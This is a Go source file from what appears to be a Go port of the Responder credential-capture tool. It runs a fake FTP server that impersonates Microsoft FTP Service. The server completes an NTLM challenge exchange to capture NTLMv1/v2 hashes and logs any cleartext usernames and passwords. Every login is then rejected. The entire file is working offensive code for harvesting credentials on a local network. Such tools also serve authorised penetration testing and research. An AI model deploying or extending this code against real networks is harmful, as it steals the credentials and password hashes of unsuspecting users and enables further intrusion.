package server

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"net"
	"strings"
	"time"

	"go-responder/internal/core"
)

func ServeFTP(ifaceIP net.IP) {
	ln, err := net.Listen("tcp4", fmt.Sprintf("%s:21", ifaceIP))
	if err != nil {
		core.LogError("FTP listen :21 - %v (need root?)", err)
		return
	}
	core.LogInfo("FTP  listening on %s:21", ifaceIP)
	for {
		c, err := ln.Accept()
		if err != nil {
			continue
		}
		go HandleFTP(c)
	}
}

func HandleFTP(c net.Conn) {
	defer c.Close()
	c.SetDeadline(time.Now().Add(60 * time.Second))

	challenge := core.GetChallenge()
	w := bufio.NewWriter(c)
	r := bufio.NewReader(c)
	ftpUser := ""

	send := func(msg string) { fmt.Fprintf(w, "%s\r\n", msg); w.Flush() }

	send("220 Microsoft FTP Service")

	for {
		line, err := r.ReadString('\n')
		if err != nil {
			return
		}
		line = strings.TrimRight(line, "\r\n")
		upper := strings.ToUpper(line)

		if upper == "AUTH NTLM" || strings.HasPrefix(upper, "AUTH NTLM ") {
			var token string
			if strings.Contains(upper, " ") {
				parts := strings.SplitN(line, " ", 3)
				if len(parts) == 3 {
					token = parts[2]
				}
			}

			if token == "" {
				send("334 ")
				token, err = r.ReadString('\n')
				if err != nil {
					return
				}
				token = strings.TrimRight(token, "\r\n")
			}

			raw, err := base64.StdEncoding.DecodeString(token)
			if err != nil {
				send("530 Authentication failed")
				return
			}
			ntlm := core.FindNTLMSSP(raw)
			if len(ntlm) < 12 {
				send("530 Authentication failed")
				return
			}
			if core.NTLMMsgType(ntlm) != 1 {
				send("530 Authentication failed")
				return
			}

			core.LogVerbose("FTP NTLM Type1 from %s", c.RemoteAddr())
			ntlmChallenge := core.BuildNTLMChallenge(challenge, core.SessionDomain, core.SessionMachineName)
			send("334 " + base64.StdEncoding.EncodeToString(ntlmChallenge))

			type3Line, err := r.ReadString('\n')
			if err != nil {
				return
			}
			type3Line = strings.TrimRight(type3Line, "\r\n")
			raw3, err := base64.StdEncoding.DecodeString(type3Line)
			if err != nil {
				send("530 Authentication failed")
				return
			}
			ntlm3 := core.FindNTLMSSP(raw3)
			if len(ntlm3) < 12 || core.NTLMMsgType(ntlm3) != 3 {
				send("530 Authentication failed")
				return
			}
			hash, user, domain, ntlmVer, err := core.ParseNTLMAuthenticate(ntlm3, challenge)
			if err == nil {
				core.SaveCapture("FTP", c.RemoteAddr().String(), user, domain, ntlmVer, hash)
			}
			send("530 Authentication failed")
			return

		} else if strings.HasPrefix(upper, "USER ") {
			ftpUser = strings.TrimSpace(line[5:])
			send("331 Password required")
		} else if strings.HasPrefix(upper, "PASS ") {
			pass := strings.TrimPrefix(line, "PASS ")
			pass = strings.TrimPrefix(pass, "pass ")
			if pass != "" {
				core.SaveCleartext("FTP", c.RemoteAddr().String(), ftpUser, "", pass)
			}
			send("530 Login incorrect")
			return
		} else if upper == "QUIT" {
			send("221 Goodbye")
			return
		} else {
			send("530 Please login with USER and PASS or AUTH NTLM")
		}
	}
}
